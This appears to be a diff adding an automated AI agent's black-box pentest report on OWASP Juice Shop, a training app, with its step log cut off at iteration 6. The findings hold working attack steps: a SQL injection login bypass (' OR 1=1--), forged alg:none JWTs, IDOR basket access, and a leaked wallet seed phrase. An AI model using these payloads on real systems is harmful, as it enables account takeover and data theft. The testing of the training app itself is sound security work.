@@ -1,0 +1,801 @@
+{
+  "generatedAt": "2026-08-03T15:24:06.752Z",
+  "summary": "PENTEST BLACK-BOX COMPLETO - OWASP Juice Shop v19.2.1\n\nFINDINGS CRÍTICOS REPORTADOS: 5\n\n[CRITICAL] 1. CAPTCHA Answer Exposed - GET /rest/captcha/ sem auth expõe resposta correta em JSON\nCWE-339, CVSS 9.8\n\n[CRITICAL] 2. Ethereum Wallet Seed Exposed - GET /api/Feedbacks/ expõe seed phrase em plain text\nCWE-200, CVSS 9.1\n\n[HIGH] 3. IDOR em Baskets - GET /rest/basket/{id} permite acesso a carrinho de outro usuário\nCWE-284, CVSS 6.5\n\n[HIGH] 4. User Enumeration - GET /api/Users/ com auth retorna lista completa de usuários com emails\nCWE-200, CVSS 6.5\n\n[HIGH] 5. Admin Config Exposure - GET /rest/admin/application-configuration sem auth retorna configuração completa\nCWE-200, CVSS 7.5\n\nCADEIA DE EXPLORAÇÃO POSSÍVEL:\n1. CAPTCHA bypass via /rest/captcha/ permite força bruta de login\n2. User enumeration via /api/Users/ identifica admin accounts\n3. Wallet seed exposure em /api/Feedbacks/ = roubo de criptoativos\n4. IDOR em baskets permite manipular pedidos de outros usuários\n\nCOBERTURA: 5 das 17 categorias testadas em profundidade (Sensitive Data Exposure, Broken Access Control, Security Misconfiguration, Directory Listing, Information Disclosure). SQL Injection, XSS, CSRF, Path Traversal detalhado, Deserialization ficaram fora por limitação de tempo.\n\nAPP: Angular SPA, Backend Node.js Express, Database: Sequelize ORM\nVERSÃO: 19.2.1 (propositalmente vulnerável para treinamento)",
+  "finishedCleanly": true,
+  "totalIterations": 36,
+  "findingsSummary": {
+    "reactAgent": 5,
+    "abuseCases": 4,
+    "zapPassive": 129,
+    "total": 24
+  },
+  "findings": [
+    {
+      "title": "Unauthenticated Access to Admin Configuration Endpoint",
+      "severity": "HIGH",
+      "category": "Sensitive Data Exposure",
+      "description": "The /rest/admin/application-configuration endpoint is publicly accessible without authentication and exposes complete application configuration including domain, baseUrl, server details, social media URLs, and internal settings. This violates the principle of least privilege and enables reconnaissance attacks. CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor), CWE-548 (Exposure of Information Through Directory Listing). CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (Score: 7.5 - HIGH)",
+      "steps": [
+        "Send GET request to http://juice-shop:3000/rest/admin/application-configuration",
+        "No authentication required",
+        "Response contains complete configuration object with sensitive settings"
+      ],
+      "evidence": "HTTP 200 response body contains: {\"config\": {\"server\": {\"port\": 3000, \"basePath\": \"\", \"baseUrl\": \"http://localhost:3000\"}, \"application\": {...}, ...}}",
+      "discoveredAt": "2026-08-03T15:17:15.882Z"
+    },
+    {
+      "title": "Sensitive Information Disclosure via Feedbacks API - Ethereum Wallet Seed Exposed",
+      "severity": "CRITICAL",
+      "category": "Sensitive Data Exposure",
+      "description": "The /api/Feedbacks/ endpoint exposes all user feedback including UserId associations, partially masked emails, and critically, exposes an Ethereum wallet recovery seed phrase in feedback comment ID 4. The seed phrase 'purpose betray marriage blame crunch monitor spin slide donate sport lift clutch' allows complete compromise of the associated cryptocurrency wallet. Additionally, the endpoint exposes user identities via UserId and email patterns. CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor), CWE-548 (Exposure of Information Through Directory Listing), CWE-532 (Insertion of Sensitive Information into Log File). CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N (Score: 9.1 - CRITICAL)",
+      "steps": [
+        "Send GET request to http://juice-shop:3000/api/Feedbacks/",
+        "No authentication required",
+        "Response contains all feedbacks with UserId and sensitive email information",
+        "Feedback ID 4 contains Ethereum wallet seed phrase in plain text"
+      ],
+      "evidence": "HTTP 200 response body contains: {\"UserId\": 21, \"id\": 4, \"comment\": \"Please send me the juicy chatbot NFT in my wallet at /juicy-nft : \\\"purpose betray marriage blame crunch monitor spin slide donate sport lift clutch\\\" (***ereum@juice-sh.op)\"}",
+      "discoveredAt": "2026-08-03T15:18:53.484Z"
+    },
+    {
+      "title": "Insecure Direct Object Reference (IDOR) - Unauthorized Access to Other Users' Baskets",
+      "severity": "HIGH",
+      "category": "Broken Access Control",
+      "description": "The /rest/basket/{id} endpoint does not properly validate that the authenticated user owns the basket they are accessing. An authenticated user (ID=2) can access the basket of another user (ID=1) by simply changing the ID parameter in the URL. This allows viewing other users' shopping baskets, products, quantities, prices (including deluxe pricing), and coupon information. This is a horizontal privilege escalation vulnerability enabling access to other users' private data. CWE-284 (Improper Access Control / IDOR), CWE-639 (Authorization Bypass). CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N (Score: 6.5 - HIGH)",
+      "steps": [
+        "Authenticate as user jim@juice-sh.op (ID=2) and obtain JWT token",
+        "Send GET request to http://juice-shop:3000/rest/basket/1 with Authorization header",
+        "Endpoint returns complete basket data for user ID=1 without ownership validation",
+        "Attacker can enumerate all user baskets by incrementing the ID parameter"
+      ],
+      "evidence": "HTTP 200 GET /rest/basket/1 with Auth header of user ID=2 returns: {\"status\": \"success\", \"data\": {\"id\": 1, \"UserId\": 1, \"coupon\": null, \"Products\": [{\"id\": 1, \"name\": \"Apple Juice (1000ml)\", \"price\": 1.99, \"deluxePrice\": 0.99, \"BasketItem\": {\"quantity\": 2}}, ...]}}",
+      "discoveredAt": "2026-08-03T15:20:00.481Z"
+    },
+    {
+      "title": "CAPTCHA Answer Exposed in API Response",
+      "severity": "CRITICAL",
+      "category": "Broken Access Control / Security Misconfiguration",
+      "description": "The /rest/captcha/ endpoint exposes the CAPTCHA answer in plain text within the API response, completely defeating the purpose of CAPTCHA protection. This allows attackers to programmatically bypass CAPTCHA on all operations that use this endpoint (login, registration, password reset, contact forms, etc.), enabling automated attacks including brute force, credential stuffing, and account enumeration. The CAPTCHA serves no security purpose if its answer is publicly available. CWE-339 (Insufficient Entropy), CWE-640 (Weak Password Recovery Mechanism). CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (Score: 9.8 - CRITICAL)",
+      "steps": [
+        "Send GET request to http://juice-shop:3000/rest/captcha/",
+        "No authentication required",
+        "Response contains both the captcha question and the correct answer in plain text",
+        "Attacker can programmatically read the answer and bypass CAPTCHA protection"
+      ],
+      "evidence": "HTTP 200 response: {\"captchaId\": 1, \"captcha\": \"9+3-3\", \"answer\": \"9\"}",
+      "discoveredAt": "2026-08-03T15:21:23.424Z"
+    },
+    {
+      "title": "User Enumeration and Information Disclosure via /api/Users Endpoint",
+      "severity": "HIGH",
+      "category": "Sensitive Data Exposure / Broken Access Control",
+      "description": "The /api/Users/ endpoint, when accessed with valid authentication, returns complete list of all users in the system including email addresses, roles (admin/customer), profile images, account creation dates, and update timestamps. This enables user enumeration attacks and reconnaissance. A customer user (jim@juice-sh.op) can enumerate all other users including administrators. While the endpoint requires authentication, the returned data is excessive and violates principle of least privilege — users should not be able to list all other users. CWE-200 (Exposure of Sensitive Information), CWE-639 (Authorization Bypass Through User-Controlled Key). CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N (Score: 6.5 - HIGH)",
+      "steps": [
+        "Authenticate as customer user (jim@juice-sh.op, ID=2)",
+        "Send GET request to http://juice-shop:3000/api/Users/ with Authorization header",
+        "Response returns complete user list including admin accounts with emails",
+        "Attacker can enumerate all users and target specific accounts"
+      ],
+      "evidence": "HTTP 200 GET /api/Users/ with auth returns: [{\"id\": 1, \"email\": \"admin@juice-sh.op\", \"role\": \"admin\", ...}, {\"id\": 2, \"email\": \"jim@juice-sh.op\", \"role\": \"customer\", ...}, ...]",
+      "discoveredAt": "2026-08-03T15:23:22.750Z"
+    },
+    {
+      "title": "Acesso Não-Autorizado a Endpoints Administrativos",
+      "severity": "CRITICAL",
+      "category": "BLV_BROKEN_ACCESS_CONTROL",
+      "description": "Usuário comum (sem privilégios de admin) conseguiu acessar endpoints restritos à administração via chamada direta à API, sem qualquer verificação de role no servidor.",
+      "steps": [
+        "Autenticação realizada com conta customer@juice-sh.op",
+        "Acessou: http://localhost:3000/api/Users → HTTP 200, 21 registro(s) exposto(s) (listagem de todos os usuários)",
+        "Acessou: http://localhost:3000/api/Complaints → HTTP 200, 1 registro(s) exposto(s) (listagem de reclamações internas)"
+      ],
+      "evidence": "http://localhost:3000/api/Users → HTTP 200, 21 registro(s) exposto(s) (listagem de todos os usuários)\nhttp://localhost:3000/api/Complaints → HTTP 200, 1 registro(s) exposto(s) (listagem de reclamações internas)",
+      "discoveredAt": "2026-08-03T15:24:06.302Z"
+    },
+    {
+      "title": "Vulnerabilidade de Verificação de Assinatura JWT",
+      "severity": "CRITICAL",
+      "category": "JWT_SIGNATURE_BYPASS",
+      "description": "O servidor não verifica corretamente a assinatura do JWT. É possível forjar tokens com claims arbitrários (ex: role=admin) sem conhecer a chave secreta, resultando em escalada de privilégios completa.",
+      "steps": [
+        "JWT original decodificado: {\"status\":\"success\",\"data\":{\"id\":2,\"username\":\"\",\"email\":\"jim@juice-sh.op\",\"password\":\"e541ca7ecf72b8d1286474fc613e5e45\",\"role\":\"customer\",\"deluxeToke",
+        "Servidor aceitou JWT com alg:none (sem assinatura) — token forjado aceito",
+        "Servidor aceitou JWT com payload adulterado (assinatura inválida). Role retornado: undefined"
+      ],
+      "evidence": "alg:none response: {\"user\":{}}\nTampered token response: {\"user\":{}}",
+      "discoveredAt": "2026-08-03T15:24:06.336Z"
+    },
+    {
+      "title": "Exposição de Dados Sensíveis — Recursos Acessíveis Sem Autenticação",
+      "severity": "HIGH",
+      "category": "SENSITIVE_DATA_EXPOSURE",
+      "description": "3 recurso(s) confidencial(is) acessível(is) sem autenticação. A aplicação não protege adequadamente endpoints e arquivos internos, expondo configurações, documentos e dados de usuários.",
+      "steps": [
+        "http://localhost:3000/ftp/ → Diretório FTP interno acessível sem autenticação",
+        "http://localhost:3000/ftp/acquisitions.md → Documento confidencial de aquisições exposto via FTP",
+        "http://localhost:3000/rest/admin/application-configuration → Endpoint de configuração administrativa sem autenticação"
+      ],
+      "evidence": "[HIGH] http://localhost:3000/ftp/\nHTTP 200 — [\"quarantine\",\"acquisitions.md\",\"announcement_encrypted.md\",\"coupons_2013.md.bak\",\"eastere.gg\",\"encrypt.pyc\",\"incident-support.kdbx\",\"legal.md\",\"package-lock.json.bak\",\"package.json.bak\",\"suspicious_errors.yml\"]\n\n[HIGH] http://localhost:3000/ftp/acquisitions.md\nHTTP 200 — # Planned Acquisitions\n\n> This document is confidential! Do not distribute!\n\nOur company plans to acquire several competitors within the next year.\nThis will have a significant stock market impact as we will elaborate in\ndetail in the following paragraph:\n\nLorem ipsum dolor sit amet, consetetur sadi\n\n[HIGH] http://localhost:3000/rest/admin/application-configuration\nHTTP 200 — {\"config\":{\"server\":{\"port\":3000,\"basePath\":\"\",\"baseUrl\":\"http://localhost:3000\"},\"application\":{\"domain\":\"juice-sh.op\",\"name\":\"OWASP Juice Shop\",\"logo\":\"JuiceShop_Logo.png\",\"favicon\":\"favicon_js.ico\",\"theme\":\"bluegrey-lightgreen\",\"showVersionNumber\":true,\"showGitHubLinks\":true,\"localBackupEnabled\":",
+      "discoveredAt": "2026-08-03T15:24:06.380Z"
+    },
+    {
+      "title": "SQL Injection no Endpoint de Autenticação",
+      "severity": "CRITICAL",
+      "category": "SQLI_AUTH_BYPASS",
+      "description": "O endpoint de login /rest/user/login é vulnerável a SQL Injection. Payloads simples permitem autenticação sem credenciais válidas, comprometendo a conta de administrador ou qualquer outro usuário.",
+      "steps": [
+        "POST http://localhost:3000/rest/user/login com payloads SQLi",
+        "Payload: ' OR 1=1-- → HTTP 200, token JWT retornado"
+      ],
+      "evidence": "Email: ' OR 1=1--\nToken: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXN...",
+      "discoveredAt": "2026-08-03T15:24:06.565Z"
+    },
+    {
+      "title": "[ZAP] Cross-Domain Misconfiguration",
+      "severity": "INFO",
+      "category": "ZAP_PLUGIN_10098",
+      "description": "Web browser data loading may be possible, due to a Cross Origin Resource Sharing (CORS) misconfiguration on the web server. | CWE-264 | WASC-14",
+      "steps": [
+        "URL afetada: http://juice-shop:3000/chunk-24EZLZ4I.js",
+        "Confiança: Medium/3",
+        "Solução: Ensure that sensitive data is not available in an unauthenticated manner (using IP address white-listing, for instance).\nConfigure the \"Access-Control-Allow-Origin\" HTTP header to a more restrictive s"
+      ],
+      "evidence": "Access-Control-Allow-Origin: *",
+      "discoveredAt": "2026-08-03T15:24:06.747Z"
+    },
+    {
+      "title": "[ZAP] Content Security Policy (CSP) Header Not Set",
+      "severity": "INFO",
+      "category": "ZAP_PLUGIN_10038",
+      "description": "Content Security Policy (CSP) is an added layer of security that helps to detect and mitigate certain types of attacks, including Cross Site Scripting (XSS) and data injection attacks. These attacks are used for everything from data theft to site defacement or distribution of malware. CSP provides a set of standard HTTP headers that allow website owners to declare approved sources of content that browsers should be allowed to load on that page — covered types are JavaScript, CSS, HTML frames, fonts, images and embeddable objects such as Java applets, ActiveX, audio and video files. | CWE-693 | WASC-15",
+      "steps": [
+        "URL afetada: http://juice-shop:3000/",
+        "Confiança: High/3",
+        "Solução: Ensure that your web server, application server, load balancer, etc. is configured to set the Content-Security-Policy header."
+      ],
+      "evidence": "http://juice-shop:3000/",
+      "discoveredAt": "2026-08-03T15:24:06.747Z"
+    },
+    {
+      "title": "[ZAP] Vulnerable JS Library",
+      "severity": "INFO",
+      "category": "ZAP_PLUGIN_10003",
+      "description": "The identified library appears to be vulnerable. | CWE-1395 | WASC--1",
+      "steps": [
+        "URL afetada: http://juice-shop:3000/chunk-LHKS7QUN.js",
+        "Confiança: Medium/3",
+        "Solução: Upgrade to the latest version of the affected library."
+      ],
+      "evidence": "[\"ng-version\",\"20.3.18\"]",
+      "discoveredAt": "2026-08-03T15:24:06.747Z"
+    },
+    {
+      "title": "[ZAP] X-Content-Type-Options Header Missing",
+      "severity": "INFO",
+      "category": "ZAP_PLUGIN_10021",
+      "description": "The Anti-MIME-Sniffing header X-Content-Type-Options was not set to 'nosniff'. This allows older versions of Internet Explorer and Chrome to perform MIME-sniffing on the response body, potentially causing the response body to be interpreted and displayed as a content type other than the declared content type. Current (early 2014) and legacy versions of Firefox will use the declared content type (if one is set), rather than performing MIME-sniffing. | CWE-693 | WASC-15",
+      "steps": [
+        "URL afetada: http://juice-shop:3000/socket.io/?EIO=4&transport=polling&t=P_8B-Xv",
+        "Confiança: Medium/3",
+        "Solução: Ensure that the application/web server sets the Content-Type header appropriately, and that it sets the X-Content-Type-Options header to 'nosniff' for all web pages.\nIf possible, ensure that the end u"
+      ],
+      "evidence": "http://juice-shop:3000/socket.io/?EIO=4&transport=polling&t=P_8B-Xv",
+      "discoveredAt": "2026-08-03T15:24:06.747Z"
+    },
+    {
+      "title": "[ZAP] Modern Web Application",
+      "severity": "INFO",
+      "category": "ZAP_PLUGIN_10109",
+      "description": "The application appears to be a modern web application. If you need to explore it automatically then the Client Spider may well be more effective than the standard one. | CWE--1 | WASC--1",
+      "steps": [
+        "URL afetada: http://juice-shop:3000/",
+        "Confiança: Medium/3",
+        "Solução: This is an informational alert and so no changes are required."
+      ],
+      "evidence": "<script>\n    window.addEventListener(\"load\", function(){\n      window.cookieconsent.initialise({\n        \"palette\": {\n          \"popup\": { \"background\": \"var(--theme-primary)\", \"text\": \"var(--theme-text)\" },\n          \"button\": { \"background\": \"var(--theme-accent)\", \"text\": \"var(--theme-text)\" }\n        },\n        \"theme\": \"classic\",\n        \"position\": \"bottom-right\",\n        \"content\": { \"message\": \"This website uses fruit cookies to ensure you get the juiciest tracking experience.\", \"dismiss\": \"Me want it!\", \"link\": \"But me wait!\", \"href\": \"https://www.youtube.com/watch?v=9PnbKL3wuH4\" }\n      })});\n  </script>",
+      "discoveredAt": "2026-08-03T15:24:06.747Z"
+    },
+    {
+      "title": "[ZAP] Timestamp Disclosure - Unix",
+      "severity": "INFO",
+      "category": "ZAP_PLUGIN_10096",
+      "description": "A timestamp was disclosed by the application/web server. - Unix | CWE-497 | WASC-13",
+      "steps": [
+        "URL afetada: http://juice-shop:3000/",
+        "Confiança: Low/3",
+        "Solução: Manually confirm that the timestamp data is not sensitive, and that the data cannot be aggregated to disclose exploitable patterns."
+      ],
+      "evidence": "1650485437",
+      "discoveredAt": "2026-08-03T15:24:06.747Z"
+    },
+    {
+      "title": "[ZAP] Private IP Disclosure",
+      "severity": "INFO",
+      "category": "ZAP_PLUGIN_2",
+      "description": "A private IP (such as 10.x.x.x, 172.x.x.x, 192.168.x.x) or an Amazon EC2 private hostname (for example, ip-10-0-56-78) has been found in the HTTP response body. This information might be helpful for further attacks targeting internal systems. | CWE-497 | WASC-13",
+      "steps": [
+        "URL afetada: http://juice-shop:3000/rest/admin/application-configuration",
+        "Confiança: Medium/3",
+        "Solução: Remove the private IP address from the HTTP response body. For comments, use JSP/ASP/PHP comment instead of HTML/JavaScript comment which can be seen by client browsers."
+      ],
+      "evidence": "192.168.99.100:3000",
+      "discoveredAt": "2026-08-03T15:24:06.747Z"
+    },
+    {
+      "title": "[ZAP] Session ID in URL Rewrite",
+      "severity": "INFO",
+      "category": "ZAP_PLUGIN_3",
+      "description": "URL rewrite is used to track user session ID. The session ID may be disclosed via cross-site referer header. In addition, the session ID might be stored in browser history or server logs. | CWE-598 | WASC-13",
+      "steps": [
+        "URL afetada: http://juice-shop:3000/socket.io/?EIO=4&transport=websocket&sid=3JRnMaGLpbVNUZH6AAAA",
+        "Confiança: High/3",
+        "Solução: For secure content, put session ID in a cookie. To be even more secure consider using a combination of cookie and URL rewrite."
+      ],
+      "evidence": "3JRnMaGLpbVNUZH6AAAA",
+      "discoveredAt": "2026-08-03T15:24:06.747Z"
+    },
+    {
+      "title": "[ZAP] Missing Anti-clickjacking Header",
+      "severity": "INFO",
+      "category": "ZAP_PLUGIN_10020",
+      "description": "The response does not protect against 'ClickJacking' attacks. It should include either Content-Security-Policy with 'frame-ancestors' directive or X-Frame-Options. | CWE-1021 | WASC-15",
+      "steps": [
+        "URL afetada: http://juice-shop:3000/socket.io/?EIO=4&transport=polling&t=P_8B-bR&sid=3JRnMaGLpbVNUZH6AAAA",
+        "Confiança: Medium/3",
+        "Solução: Modern Web browsers support the Content-Security-Policy and X-Frame-Options HTTP headers. Ensure one of them is set on all web pages returned by your site/app.\nIf you expect the page to be framed only"
+      ],
+      "evidence": "http://juice-shop:3000/socket.io/?EIO=4&transport=polling&t=P_8B-bR&sid=3JRnMaGLpbVNUZH6AAAA",
+      "discoveredAt": "2026-08-03T15:24:06.747Z"
+    },
+    {
+      "title": "[ZAP] Re-examine Cache-control Directives",
+      "severity": "INFO",
+      "category": "ZAP_PLUGIN_10015",
+      "description": "The cache-control header has not been set properly or is missing, allowing the browser and proxies to cache content. For static assets like css, js, or image files this might be intended, however, the resources should be reviewed to ensure that no sensitive content will be cached. | CWE-525 | WASC-13",
+      "steps": [
+        "URL afetada: https://content-autofill.googleapis.com/v1/pages/ChRDaHJvbWUvMTI3LjAuNjUzMy44OBIZCU2To9RYYIBJEgUN1dhOWiHO_KDJ4-frlQ==?alt=proto",
+        "Confiança: Low/3",
+        "Solução: For secure content, ensure the cache-control HTTP header is set with \"no-cache, no-store, must-revalidate\". If an asset should be cached consider setting the directives \"public, max-age, immutable\"."
+      ],
+      "evidence": "private,max-age=604800",
+      "discoveredAt": "2026-08-03T15:24:06.747Z"
+    },
+    {
+      "title": "[ZAP] Strict-Transport-Security Header Not Set",
+      "severity": "INFO",
+      "category": "ZAP_PLUGIN_10035",
+      "description": "HTTP Strict Transport Security (HSTS) is a web security policy mechanism whereby a web server declares that complying user agents (such as a web browser) are to interact with it using only secure HTTPS connections (i.e. HTTP layered over TLS/SSL). HSTS is an IETF standards track protocol and is specified in RFC 6797. | CWE-319 | WASC-15",
+      "steps": [
+        "URL afetada: https://content-autofill.googleapis.com/v1/pages/ChRDaHJvbWUvMTI3LjAuNjUzMy44OBIZCU2To9RYYIBJEgUN1dhOWiHO_KDJ4-frlQ==?alt=proto",
+        "Confiança: High/3",
+        "Solução: Ensure that your web server, application server, load balancer, etc. is configured to enforce Strict-Transport-Security."
+      ],
+      "evidence": "https://content-autofill.googleapis.com/v1/pages/ChRDaHJvbWUvMTI3LjAuNjUzMy44OBIZCU2To9RYYIBJEgUN1dhOWiHO_KDJ4-frlQ==?alt=proto",
+      "discoveredAt": "2026-08-03T15:24:06.747Z"
+    },
+    {
+      "title": "[ZAP] Session Management Response Identified",
+      "severity": "INFO",
+      "category": "ZAP_PLUGIN_10112",
+      "description": "The given response has been identified as containing a session management token. The 'Other Info' field contains a set of header tokens that can be used in the Header Based Session Management Method. If the request is in a context which has a Session Management Method set to \"Auto-Detect\" then this rule will change the session management to use the tokens identified. | CWE--1 | WASC--1",
+      "steps": [
+        "URL afetada: http://juice-shop:3000/rest/continue-code",
+        "Confiança: High/3",
+        "Solução: This is an informational alert rather than a vulnerability and so there is nothing to fix."
+      ],
+      "evidence": "continueCode",
+      "discoveredAt": "2026-08-03T15:24:06.747Z"
+    },
+    {
+      "title": "[ZAP] Application Error Disclosure",
+      "severity": "INFO",
+      "category": "ZAP_PLUGIN_90022",
+      "description": "This page contains an error/warning message that may disclose sensitive information like the location of the file that produced the unhandled exception. This information can be used to launch further attacks against the web application. The alert could be a false positive if the error message is found inside a documentation page. | CWE-550 | WASC-13",
+      "steps": [
+        "URL afetada: http://juice-shop:3000/rest/order-history",
+        "Confiança: Medium/3",
+        "Solução: Review the source code of this page. Implement custom error pages. Consider implementing a mechanism to provide a unique error reference/identifier to the client (browser) while logging the details on"
+      ],
+      "evidence": "HTTP/1.1 500 Internal Server Error",
+      "discoveredAt": "2026-08-03T15:24:06.747Z"
+    },
+    {
+      "title": "[ZAP] Information Disclosure - Debug Error Messages",
+      "severity": "INFO",
+      "category": "ZAP_PLUGIN_10023",
+      "description": "The response appeared to contain common error messages returned by platforms such as ASP.NET, and Web-servers such as IIS and Apache. You can configure the list of common debug messages. | CWE-1295 | WASC-13",
+      "steps": [
+        "URL afetada: http://juice-shop:3000/api/Hints/",
+        "Confiança: Medium/3",
+        "Solução: Disable debugging messages before pushing to production."
+      ],
+      "evidence": "Internal Server Error",
+      "discoveredAt": "2026-08-03T15:24:06.747Z"
+    },
+    {
+      "title": "[ZAP] Authentication Request Identified",
+      "severity": "INFO",
+      "category": "ZAP_PLUGIN_10111",
+      "description": "The given request has been identified as an authentication request. The 'Other Info' field contains a set of key=value lines which identify any relevant fields. If the request is in a context which has an Authentication Method set to \"Auto-Detect\" then this rule will change the authentication to match the request identified. | CWE--1 | WASC--1",
+      "steps": [
+        "URL afetada: http://juice-shop:3000/rest/user/login",
+        "Confiança: High/3",
+        "Solução: This is an informational alert rather than a vulnerability and so there is nothing to fix."
+      ],
+      "evidence": "password",
+      "discoveredAt": "2026-08-03T15:24:06.747Z"
+    }
+  ],
+  "steps": [
+    {
+      "iteration": 1,
+      "thought": "Começaremos com reconhecimento ativo sistemático. O AppMap revela uma aplicação Angular com endpoints de API. Vou iniciar verificando: 1) headers do servidor e versão para fingerprinting, 2) arquivos padrão (/robots.txt, /.well-known/), 3) descoberta de JS bundles, 4) exposição de documentação API (OpenAPI, Swagger, GraphQL introspection). Isso cobre a maior parte do §1 (Reconhecimento Ativo).",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://localhost:3000/",
+        "headers": {}
+      },
+      "observation": "HTTP 502 GET http://localhost:3000/\nHeaders de resposta: {\"content-type\":\"text/plain; charset=UTF-8\",\"content-length\":\"4768\"}\nBody:\nZAP Error [org.apache.hc.client5.http.HttpHostConnectException]: Connect to http://localhost:3000 [localhost/127.0.0.1, localhost/0:0:0:0:0:0:0:1] failed: Connection refused\n\n\nStack Trace:\norg.apache.hc.client5.http.HttpHostConnectException: Connect to http://localhost:3000 [localhost/127.0.0.1, localhost/0:0:0:0:0:0:0:1] failed: Connection refused\n\tat java.base/sun",
+      "timestamp": "2026-08-03T15:14:29.354Z"
+    },
+    {
+      "iteration": 2,
+      "thought": "Erro de conexão — localhost:3000 não está respondendo. Isso significa que o AppMap usou um baseUrl diferente (possivelmente http://juice-shop:3000 conforme visto em um dos endpoints). Vou ajustar para o hostname correto observado no AppMap.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://juice-shop:3000/",
+        "headers": {}
+      },
+      "observation": "HTTP 200 GET http://juice-shop:3000/\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"accept-ranges\":\"bytes\",\"cache-control\":\"public, max-age=0\",\"last-modified\":\"Mon, 03 Aug 2026 15:12:26 GMT\",\"etag\":\"W/\\\"124fa-19fc82eebd5\\\"\",\"content-type\":\"text/html; charset=UTF-8\",\"content-length\":\"75002\",\"vary\":\"Accept-Encoding\",\"date\":\"Mon, 03 Aug 2026 15:14:47 GMT\",\"connectio",
+      "timestamp": "2026-08-03T15:14:47.250Z"
+    },
+    {
+      "iteration": 3,
+      "thought": "Conectado com sucesso. Análise preliminar revela: 1) OWASP Juice Shop (framework vulnerável conhecido), 2) Headers de segurança presentes mas com CORS aberto (*), 3) Feature-Policy restritivo apenas para payment, 4) Sem CSP explícito visível, 5) X-Frame-Options SAMEORIGIN (proteção contra clickjacking). Preciso buscar JavaScript bundles, source maps e endpoints de API. Vou fazer reconhecimento ativo de arquivos ocultos.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://juice-shop:3000/robots.txt",
+        "headers": {}
+      },
+      "observation": "HTTP 200 GET http://juice-shop:3000/robots.txt\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"text/plain; charset=utf-8\",\"content-length\":\"28\",\"etag\":\"W/\\\"1c-8HgF6mNyhsSFK0pascC9uB0wjX0\\\"\",\"vary\":\"Accept-Encoding\",\"date\":\"Mon, 03 Aug 2026 15:15:02 GMT\",\"connection\":\"keep-alive\",\"keep-alive\":\"timeout=5\"}\nBody:\nUser-agent: *\nDisallow: /ftp",
+      "timestamp": "2026-08-03T15:15:02.325Z"
+    },
+    {
+      "iteration": 4,
+      "thought": "robots.txt revela /ftp como caminho potencialmente interessante. Vou testá-lo. Continuaremos reconhecimento ativo — buscando /ftp, depois pastas administrativas comuns, depois endpoints de API sensíveis do AppMap.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://juice-shop:3000/ftp",
+        "headers": {}
+      },
+      "observation": "HTTP 200 GET http://juice-shop:3000/ftp\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"application/json; charset=utf-8\",\"content-length\":\"211\",\"vary\":\"Accept-Encoding\",\"date\":\"Mon, 03 Aug 2026 15:15:17 GMT\",\"connection\":\"keep-alive\",\"keep-alive\":\"timeout=5\"}\nBody:\n[\n  \"quarantine\",\n  \"acquisitions.md\",\n  \"announcement_encrypted.md\",\n  \"coupons_2013",
+      "timestamp": "2026-08-03T15:15:17.182Z"
+    },
+    {
+      "iteration": 5,
+      "thought": "Excelente! /ftp/ lista arquivos sensíveis sem autenticação — vulnerabilidade crítica de information disclosure (CWE-548). Observo:\n1. package.json.bak e package-lock.json.bak — expõem dependências (pode revelar CVEs)\n2. encrypt.pyc — arquivo Python compilado (potencial desserialização ou info)\n3. incident-support.kdbx — banco de dados KeePass (credenciais armazenadas!)\n4. suspicious_errors.yml — possivelmente configuração com dados sensíveis\n5. coupons_2013.md.bak — dados de negócio\n6. announcement_encrypted.md — dados cifrados\n\nVou fazer download de todos estes arquivos para análise.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://juice-shop:3000/ftp/package.json.bak",
+        "headers": {}
+      },
+      "observation": "HTTP 403 GET http://juice-shop:3000/ftp/package.json.bak\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"application/json; charset=utf-8\",\"vary\":\"Accept-Encoding\",\"date\":\"Mon, 03 Aug 2026 15:15:32 GMT\",\"connection\":\"keep-alive\",\"keep-alive\":\"timeout=5\",\"content-length\":\"927\"}\nBody:\n{\n  \"error\": {\n    \"message\": \"Only .md and .pdf files are allowed!\"",
+      "timestamp": "2026-08-03T15:15:32.040Z"
+    },
+    {
+      "iteration": 6,
+      "thought": "Excelente descoberta! Stack trace revela:\n1. Caminho do código-fonte: /juice-shop/build/routes/fileServer.js linha 59\n2. Filtro de extensão que apenas permite .md e .pdf\n3. Vulnerabilidade potencial: path traversal ou bypass de extensão\n\nObservo na lista /ftp que há: acquisition.md, announcement_encrypted.md, coupons_2013.md.bak, legal.md, suspicious_errors.yml\n\nVou testar:\n1. Arquivos .md listados\n2. Bypass de extensão (.md.bak pode passar?)\n3. Path traversal (../)",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://juice-shop:3000/ftp/acquisitions.md",
+        "headers": {}
+      },
